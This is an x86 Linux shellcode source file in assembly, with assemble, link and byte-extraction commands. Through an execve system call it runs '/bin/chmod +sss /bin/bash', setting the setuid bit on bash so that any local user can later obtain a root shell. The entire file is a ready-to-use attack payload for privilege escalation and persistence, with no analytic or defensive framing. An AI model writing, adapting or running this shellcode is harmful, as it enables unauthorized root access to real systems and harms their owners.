; execve x86 /bin/chmod +s /bin/bash - 60 bytes   by 0bfxgh0st*
;
; nasm -f elf execve_x86_chmod+s_bash.asm
; ld -o execve_x86_chmod+s_bash execve_x86_chmod+s_bash.o -m elf_i386
; objdump -d execve_x86_chmod+s_bash |grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
section .text

global _start

_start:

xor eax,eax
xor ecx,ecx
xor edx,edx

push eax
push 0x646f6d68   ; domh
push 0x632f6e69   ; c/ni
push 0x622f2f2f   ; b///
mov ebx,esp

push eax
push 0x7373732b   ; sss+
mov edi,esp

push eax
push 0x68736162   ; hsab
push 0x2f6e6962   ; /nib
push 0x2f2f2f2f   ; ////

mov esi,esp

push eax
push esi
push edi
push ebx

mov ecx,esp

mov al,11
int 0x80
